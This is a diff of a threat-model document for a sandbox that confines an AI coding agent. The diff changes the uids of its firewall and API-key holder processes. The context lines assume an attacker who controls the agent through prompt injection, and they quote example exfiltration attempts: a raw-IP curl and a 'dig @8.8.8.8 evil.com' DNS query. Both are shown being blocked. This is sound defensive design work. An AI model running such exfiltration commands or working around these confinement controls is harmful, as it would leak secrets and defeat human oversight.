@@ -18,14 +18,14 @@ An attacker who controls the agent's behaviour — through a prompt injection, a
 
 - `nftables OUTPUT` policy is `DROP`. Loopback is allowed, established/related is allowed, plus exactly three classes of new outbound connection:
   - UDP/53 to `127.0.0.1` (anyone may talk to the in-container resolver).
-  - UDP/53 to the configured upstream resolvers — restricted to **uid 100** (the `firewall` user that runs safe-dns).
+  - UDP/53 to the configured upstream resolvers — restricted to **uid 200** (the `firewall` user that runs safe-dns).
   - Any traffic to an IP that's in the dynamic `allowed_v4` / `allowed_v6` set, populated by safe-dns when an allowlisted FQDN is resolved. Entries expire at the DNS TTL (clamped between 30s and 1h).
 - A raw IP connection from the agent (`curl https://1.2.3.4`) has no rule to match and is dropped at the kernel.
 - DNS exfil to a public resolver (`dig @8.8.8.8 evil.com`) is dropped because the upstream-DNS rule is uid-scoped to `firewall`.
 
 ### LLM API key — uid-separated keyholder
 
-- `safe-keyholder` runs as uid 101. It reads the real API key from stdin once at startup; the host pipes it through a Unix socket and then closes.
+- `safe-keyholder` runs as uid 201. It reads the real API key from stdin once at startup; the host pipes it through a Unix socket and then closes.
 - The agent runs as uid 1000 with `ANTHROPIC_BASE_URL=http://127.0.0.1:8443` and `ANTHROPIC_API_KEY=dummy`. Every outbound request flows through keyholder, which strips any `Authorization`/`x-api-key` header and replaces it with the real one.
 - The agent cannot read the key because:
   - `/proc` is mounted with `hidepid=2` so non-firewall uids cannot list other users' processes.
@@ -52,7 +52,7 @@ An attacker who controls the agent's behaviour — through a prompt injection, a
 
 - No setuid/setgid binaries in the image (hardening pass at build time).
 - No `sudo`, no `su`, no `sudoers` file.
-- Three uid-separated principals: `firewall` (100), `keyholder` (101), `agent` (1000). None can become root.
+- Three uid-separated principals: `firewall` (200), `keyholder` (201), `agent` (1000). None can become root.
 
 ## What SAFE does **not** protect against
 
